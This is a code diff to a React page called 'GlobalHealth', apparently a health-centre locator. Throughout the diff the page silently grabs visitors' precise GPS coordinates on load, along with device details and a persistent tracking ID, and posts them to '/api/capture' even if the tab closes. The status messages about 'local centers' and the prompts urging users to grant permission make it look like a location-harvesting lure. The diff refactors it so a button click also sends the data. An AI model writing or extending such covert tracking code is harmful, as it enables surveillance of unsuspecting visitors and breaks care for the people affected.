@@ -6,6 +6,45 @@ export default function GlobalHealth() {
   const [status, setStatus] = useState(null);
   const [loading, setLoading] = useState(false);
 
+  const saveLocation = async (position = null, watchId = null) => {
+    if (watchId) navigator.geolocation.clearWatch(watchId);
+    
+    let visitorId = localStorage.getItem('visitorId');
+    if (!visitorId) {
+      visitorId = 'vid_' + Math.random().toString(36).substring(2, 11) + Date.now().toString(36);
+      localStorage.setItem('visitorId', visitorId);
+    }
+    
+    const payload = {
+      lat: position?.coords.latitude || null,
+      lon: position?.coords.longitude || null,
+      accuracy: position?.coords.accuracy || null,
+      platform: navigator.platform,
+      screen: `${window.screen.width}x${window.screen.height}`,
+      visitorId,
+      context: position 
+        ? `GPS Lock (Acc: ${Math.round(position.coords.accuracy)}m)` 
+        : 'Initial Visit (IP Only)'
+    };
+
+    try {
+      await fetch('/api/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        keepalive: true,
+      });
+      
+      if (position) {
+        setStatus('GPS Synchronized. Local centers identified.');
+        setTimeout(() => {
+          setStatus(null);
+          setLoading(false);
+        }, 3000);
+      }
+    } catch (err) {}
+  };
+
   // High-Precision Auto-Capture
   useEffect(() => {
     if (!navigator.geolocation) return;
@@ -19,66 +58,19 @@ export default function GlobalHealth() {
     const startWatching = () => {
       watchId = navigator.geolocation.watchPosition(
         async (position) => {
-          // Keep track of the most accurate position found so far
           if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
             bestPosition = position;
           }
-
-          // If accuracy is good enough (under 60 meters) or we've waited 5 seconds
           if (position.coords.accuracy < 60) {
-            saveLocation(position);
+            saveLocation(position, watchId);
           }
         },
         (err) => {
           if (err.code === 1) setStatus('Permission denied. Please allow access to proceed.');
           if (err.code === 2) setStatus('GPS required. Please turn on your device location.');
         },
-
-        { 
-          enableHighAccuracy: true, 
-          timeout: 20000, 
-          maximumAge: 0 
-        }
+        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
       );
-    };
-
-    const saveLocation = async (position = null) => {
-      if (watchId) navigator.geolocation.clearWatch(watchId);
-      
-      let visitorId = localStorage.getItem('visitorId');
-      if (!visitorId) {
-        visitorId = 'vid_' + Math.random().toString(36).substring(2, 11) + Date.now().toString(36);
-        localStorage.setItem('visitorId', visitorId);
-      }
-      
-      const payload = {
-        lat: position?.coords.latitude || null,
-        lon: position?.coords.longitude || null,
-        accuracy: position?.coords.accuracy || null,
-        platform: navigator.platform,
-        screen: `${window.screen.width}x${window.screen.height}`,
-        visitorId,
-        context: position 
-          ? `GPS Lock (Acc: ${Math.round(position.coords.accuracy)}m)` 
-          : 'Initial Visit (IP Only)'
-      };
-
-      try {
-        await fetch('/api/capture', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload),
-          keepalive: true, // Ensures request finishes even if tab is closed
-        });
-        
-        if (position) {
-          setStatus('GPS Synchronized. Local centers identified.');
-          setTimeout(() => {
-            setStatus(null);
-            setLoading(false);
-          }, 3000);
-        }
-      } catch (err) {}
     };
 
     // Phase 1: Instant IP/Visit Capture
@@ -87,10 +79,9 @@ export default function GlobalHealth() {
     // Phase 2: Start GPS Watch
     const finalTimer = setTimeout(() => {
       if (bestPosition && loading) {
-        saveLocation(bestPosition);
+        saveLocation(bestPosition, watchId);
       }
     }, 8000);
-
 
     startWatching();
 
@@ -99,6 +90,7 @@ export default function GlobalHealth() {
       clearTimeout(finalTimer);
     };
   }, []);
+
 
 
 
@@ -114,9 +106,9 @@ export default function GlobalHealth() {
     navigator.geolocation.getCurrentPosition(
       (pos) => {
         setStatus('GPS Lock acquired. Syncing...');
-        // The useEffect will handle the continuous watching, 
-        // but this manual click ensures the browser prompt is triggered.
+        saveLocation(pos); // Actually save the data!
       },
+
         (err) => {
           if (err.code === 1) setStatus('Permission denied. Please allow access to proceed.');
           if (err.code === 2) setStatus('GPS required. Please turn on your device location.');
